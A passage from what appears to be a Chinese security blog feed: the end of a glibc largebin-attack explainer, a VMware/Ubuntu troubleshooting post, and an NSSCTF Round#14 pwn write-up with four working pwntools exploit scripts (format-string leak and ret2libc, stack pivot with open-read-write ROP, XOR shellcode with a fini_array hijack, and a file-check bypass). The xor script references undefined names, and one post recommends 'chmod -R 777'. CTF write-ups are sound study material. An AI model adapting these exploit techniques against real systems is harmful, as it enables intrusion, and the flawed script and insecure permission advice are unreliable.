<span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                      &#123;<br>                        fwd = fwd-&gt;fd_nextsize;<br>                        assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      &#125;<br><br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                      <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                      fwd = fwd-&gt;fd;<br>                    <span class="hljs-keyword">else</span><br>                      &#123;<br>                        victim-&gt;fd_nextsize = fwd;<br>                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                        fwd-&gt;bk_nextsize = victim;<br>                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                      &#125;<br>                    bck = fwd-&gt;bk;<br>                  &#125;<br>              &#125;<br>            <span class="hljs-keyword">else</span><br>              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>          &#125;<br><br>        mark_bin (av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;<br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>这次我们从 unsortedbin 中拿出的是属于 largebin，所以进入到堆块大小判断的 else 分支，接下来就是指针的操作，由于我们的 p3 被我们修改过数据，就会跳过 while 的循环，进入下面的部分分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>&#123;<br>fwd = fwd-&gt;fd_nextsize;<br>assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br><span class="hljs-comment">/* Always insert in the second position.  */</span><br>fwd = fwd-&gt;fd;<br><span class="hljs-keyword">else</span><br>&#123;<br>victim-&gt;fd_nextsize = fwd;<br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>fwd-&gt;bk_nextsize = victim;<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以在下面的代码中，我们被修改的指针就完成了利用，修改了 stack_var1 和stack_var2 的值。</p><hr><p>觉得堆题还是要去分析一下源码，接下来就计划去看看源码</p><p><del>先做几道题练练手</del></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修师傅修虚拟机系列</title>
    <link href="/2023/08/04/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/"/>
    <url>/2023/08/04/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>真的建议大家在所有功能都好用的时候存一下快照👻</p><span id="more"></span><h1 id="实现虚拟机和主机之间的拖拽"><a href="#实现虚拟机和主机之间的拖拽" class="headerlink" title="实现虚拟机和主机之间的拖拽"></a>实现虚拟机和主机之间的拖拽</h1><blockquote><p>这个解决方法适合老版本比如16，18。我在互联网上冲浪冲了这么久看到大家都在说22版本不支持拖拽，无所谓了姐麻了</p></blockquote><p>首先需要确保虚拟机的启用拖放和启用复制粘贴选项开启</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_20-12-12.png"></p><h3 id="只能复制粘贴不能拖拽"><a href="#只能复制粘贴不能拖拽" class="headerlink" title="只能复制粘贴不能拖拽"></a>只能复制粘贴不能拖拽</h3><p>虚拟机”启用拖拽”功能已开启，但是从本机往虚拟机拖拽文件时依旧被禁止！</p><p>安装 open-vm-tools-desktop 软件，它是 VMware Tools 其中的一个组件，负责支持虚拟机和主机之间的拖拽。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure><h3 id="既不能复制粘贴也不能拖拽"><a href="#既不能复制粘贴也不能拖拽" class="headerlink" title="既不能复制粘贴也不能拖拽"></a>既不能复制粘贴也不能拖拽</h3><p><strong>重装 VMware Tools！</strong></p><p>首先要安装 VMware Tools，如果你是曾经有过VMware Tools 按钮会显示重新安装</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/11.png"></p><p>开机后会发现桌面上或者侧边栏多了一个光盘图标，点进去把压缩包复制到桌面</p><blockquote><p>下图是 Ubuntu22，我的 Ubuntu18 是一个光盘图标直接出现在桌面上</p></blockquote><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-32-05.png"></p><p>直接选中右键 “copy to” </p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-37-20.png"></p><p>在桌面打开 terminal， </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar zxfv [vmwatr-install-name]<br></code></pre></td></tr></table></figure><p>凡是让你回答 yes 或者 no 的都输入 yes 并回车</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-50-55.png"></p><p>凡是 [&#x2F;…&#x2F;…] 都按回车键</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-51-21.png"></p><p>下图这样就是安装好了</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-54-21.png"></p><h3 id="安装VMware-Tools选项显示灰色"><a href="#安装VMware-Tools选项显示灰色" class="headerlink" title="安装VMware Tools选项显示灰色"></a>安装VMware Tools选项显示灰色</h3><p>只需要以下三个步骤：</p><p>1.关闭虚拟机</p><p>2.在虚拟机设置分别设置<strong>CD&#x2F;DVD、CD&#x2F;DVD2和软盘三个部分</strong>为自动检测（如果你本来就是自动检测，就换成VMware安装目录中的 linux.iso）</p><p>3.再重启虚拟机，灰色字即点亮</p><blockquote><p>注意！如果开机以后还是不行，就重启，趁着屏幕是黑色的还没出现登录界面的时候再次查看，你就会发现它亮了🤗</p><p>快准狠！点击重新安装！！！</p></blockquote><h3 id="另辟新道路"><a href="#另辟新道路" class="headerlink" title="另辟新道路"></a>另辟新道路</h3><p>不就是想在主机和虚拟机之间共享文件嘛，直接打开浏览器登陆微信文件传输助手传输文件</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_17-32-09.png"></p><h1 id="没有网络图标"><a href="#没有网络图标" class="headerlink" title="没有网络图标"></a>没有网络图标</h1><p>没有网络图标也连不上网辣！🤔</p><p>关闭网络服务再删除文件，最后重新启动服务。在terminal中输入以下三条命令即可恢复</p><p>重启可以解决百分之九十九的问题🤤</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pf">sudo service NetworkManager stop <br> <br>sudo rm /var/lib/NetworkManager/NetworkManager.<span class="hljs-keyword">state</span> <br> <br>sudo service NetworkManager start<br></code></pre></td></tr></table></figure><blockquote><p>NetworkManager 是 22版本 对应的名称，不同版本的不一样但我也不太清楚，请自行百度</p></blockquote><h1 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h1><p>在执行文件时，你是否会遇到 <code>bash: ./pwn: Permission denied</code> 这种情况呢？</p><p>那是因为没有正确设置读取权限，我们只需要将想要用户执行读写权限的位置填入下方 <code>[]</code> 中，再复制到 terminal 中就可以解决问题了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> -R 777 [~/Desktop]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
      <tag>VMware Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF Round#14 Basic WP</title>
    <link href="/2023/08/04/NSSCTF-Round-14-Basic-WP/"/>
    <url>/2023/08/04/NSSCTF-Round-14-Basic-WP/</url>
    
    <content type="html"><![CDATA[<p>周末 NSS 的 PWN 专题，菜菜的照着别的师傅的 WP 复现一下🫥</p><span id="more"></span><h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><blockquote><p>格式化字符串+ret2libc</p></blockquote><p>是个64位的程序，开启了 canary 保护</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_main.png"></p><p>主函数中有一个明显的格式化字符串漏洞，在 <code>vlun</code> 函数中 gets 不限制输入</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_vuln.png"></p><p>考虑里用格式化字符串泄露 libc 基址，计算偏移获取 system 地址。再利用 gets 改写 GOT 表获取 shell。</p><p>格式化字符串部分 buf 存储在 BSS 段上，需要借用栈上的跳板。利用 GDB 查看 printf 处的栈数据：</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_stack.png"></p><p>栈上的第三个参数，也就是格式化字符串的第九个参数 0x7fffffffdfb8 存储的是0x7fffffffdfa8 地址，而这个地址存储 v4 的数值 （555LL 就是以十六进制存储555 这个十进制数字，就是 0x22b；同理 520LL就是 0x208），我们可以直接来改写 V4 数值实现 main 函数中的 if 条件判断进入 vuln 漏洞函数。</p><p>同时栈上的第九个参数 ( <code>%15$</code> )存储的是 canary 的值，第十一个参数 ( <code>%17$</code> ) 指向 <code>__libc_start_main+231</code>，可以推算出 libc 的基址。</p><p>所以我们的格式化字符串就构造为 <code>%520c%9$n,,%15$p,,%17$p</code>（其中 <code>,,</code> 用来分隔不同地址）</p><p>最终的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>pop_rdi=<span class="hljs-number">0x4013f3</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>payload=<span class="hljs-string">&quot;%520c%9$n,,%15$p,,%17$p&quot;</span><br>io.recvuntil(<span class="hljs-string">&#x27;I want to hear your praise of Toka\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>base=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">b&quot;__libc_start_main&quot;</span>]-<span class="hljs-number">231</span><br>sys_addr=base+libc.sym[<span class="hljs-string">b&quot;system&quot;</span>]<br>sh_addr=base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload=cyclic(<span class="hljs-number">0x28</span>)+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)<br>io.sendlineafter(<span class="hljs-string">b&quot;I know you like him, but you must pass my level\n&quot;</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h1><blockquote><p>栈迁移 + orw</p></blockquote><p><code>vuln()</code> 函数里面有一个长度0x10 的栈溢出，所以我们首先考虑栈迁移的利用 。同时在 <code>init()</code> 里面调用了<code>sandbox()</code> 禁用了execve，所以要使用 orw 。</p><p>首先移栈到 bss 然后利用 leave_ret ，移栈到前部执行泄露并回到 vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>bss=<span class="hljs-number">0x404800</span><br>leave_ret=<span class="hljs-number">0x40121d</span><br>pop_rdi=<span class="hljs-number">0x401353</span><br>read_addr=<span class="hljs-number">0x401292</span><br>vuln_addr=<span class="hljs-number">0x401270</span><br>puts_got=elf.got[<span class="hljs-string">b&quot;puts&quot;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">b&quot;puts&quot;</span>]<br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss)+p64(read_addr) <br>io.sendafter(<span class="hljs-string">b&quot;try it&quot;</span>,payload)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)<br>payload= payload.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(bss-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br><br>io.sendline(payload)<br>leak_addr=u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))-libc.sym[<span class="hljs-string">b&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(leak_addr))<br>open_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;open&quot;</span>]<br>read_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;read&quot;</span>]<br>write_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;write&quot;</span>]<br><span class="hljs-comment">#pop_rsi = libc.address + next(libc.search(asm(&#x27;pop rsi;ret&#x27;))) </span><br><span class="hljs-comment">#pop_rdx = libc.address + next(libc.search(asm(&#x27;pop rdx;ret&#x27;))) </span><br><span class="hljs-comment">#不知道为什么我用上面的命令突然就抽风不好用我手动ROPgadget找的，就是有点子慢</span><br>pop_rsi=leak_addr+<span class="hljs-number">0x2601f</span><br>pop_rdx=leak_addr+<span class="hljs-number">0x142c92</span><br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;try it\n&quot;</span>,payload)<br><br>orw=<span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span>+p64(pop_rdi)+p64(<span class="hljs-number">0x404288</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(read_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(write_addr)<br><br>orw=orw.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&quot;a&quot;</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br>io.send(orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>题目是一个任何保护都没有被开启并且 rwx 全部开启的程序</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_xor_main.png"></p><p>首先程序中有一个 flag 判断的循环，我们要保证 flag 小于 0 程序才不会退出，方便我们进行接下来的操作。</p><p>我们可以将 flag 的高位写成 0xff，这样的话 flag 的符号位会被覆写为1，即负数。</p><p><code>xorByteWithAddress()</code> 中只有两行代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">xorByteWithAddress</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-type">char</span> a2)</span><br>&#123;<br>  *a1 ^= a2;  <span class="hljs-comment">//*addr ^= value</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)++flag;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>a1</code> 是一个指向 <code>_BYTE</code> 类型的地址（即一个字节大小的数据类型），所以在这个异或的操作中，一次只能异或改写一字节的数据。</p><p>因为 rwx 可读可写可执行，我们可以直接向上面写入 sehllcode，劫持 <code>fini_array</code> 指针到shellcode处，这样我们就可以再次异或令 flag 大于零，退出程序时执行 shellcode 了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorwrite</span>(<span class="hljs-params">addr,value</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;addr:&quot;</span>,<span class="hljs-built_in">hex</span>(addr).encode())<br>    io.sendlineafter(<span class="hljs-string">b&quot;value:&quot;</span>,value)<br><br>flag=<span class="hljs-number">0x600BCC</span><br>fini_array=<span class="hljs-number">0x600970</span><br>rwx_addr=<span class="hljs-number">0x600d00</span><br><br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br><br>shellcode=asm(shellcraft.sh())<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(shellcode)):<br>    xorwrite(rwx+i,shellcode[i])<br>    <br><span class="hljs-comment">#xor_array=fini_array^rwx_addr</span><br><span class="hljs-comment">#xor_array=0x200b10</span><br>xorenc(<span class="hljs-built_in">hex</span>(fini_array).encode(),<span class="hljs-string">b&quot;0x10&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">1</span>).encode(),<span class="hljs-string">b&quot;0x0b&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">2</span>).encode(),<span class="hljs-string">b&quot;0x20&quot;</span>)<br>    <br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a>read_file</h1><p>是一个64位的菜单式的读取文件的程序，远程时可以直接读取服务器端的文件。</p><p>但是在 load_file 处有 “flag” 字符检测，也就是说我们不能直接 load flag，要尝试修改 flag 文件的 “flag” 字符。</p><p>同时在 read_file 处有文本长度的判断，不过长素质由用户输入，小于55时会自动读取 content_size + 56 的数据。</p><p>我们首先需要绕过 flag 的检查。</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_load.png"></p><p>在 <code>load_file()</code> 函数中，scanf 负责接受用户读入信息。我们知道scanf读取数据会在指定长度的数据后添加<code>\x00 </code>空字符</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_bss.png"></p><p>如上图，<em>file_name</em> 和 <em>file_id</em> 都是储存在 BSS 段并且相邻，偏移相差 8 字节。也就是说如果我们在 file_name 读取了刚好8字节的数据，其对应的 <code>\x00</code> 就会覆盖住 <em>file_id</em>，使 <em>file_id</em> 为 0。</p><p>而利用到 fild_id 的函数 <code>read(file_fd, file_content, content_size);</code> 在 fild_id&#x3D;0 时会从用户键盘来获取用户的输入而不是读取文件。</p><p>又因为在此之前由 alloca 来分配 v2 栈空间，我们可以利用 content_size 小于55的条件判断造成溢出，直接覆盖返回地址使程序跳转到 <code>file_fd = open(file_name, 0, 0LL);</code>，绕过检查再按照程序流程正常读取 flag 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">payload</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;file_name : &quot;</span>,payload)<br>    <br>load_addr=<span class="hljs-number">0x401493</span><br>read_addr=<span class="hljs-number">0x4014ee</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>load(<span class="hljs-string">b&quot;./&quot;</span>)<br>load(<span class="hljs-string">b&quot;flag.txt&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload=cyclic(<span class="hljs-number">0x18</span>)+p64(load_addr)+p64(ret)*<span class="hljs-number">2</span>+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;read more &quot;</span>,payload)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>libc</tag>
      
      <tag>orw</tag>
      
      <tag>stack pivoting</tag>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序修改路径后图标消失及右键无法打开的解决方案</title>
    <link href="/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
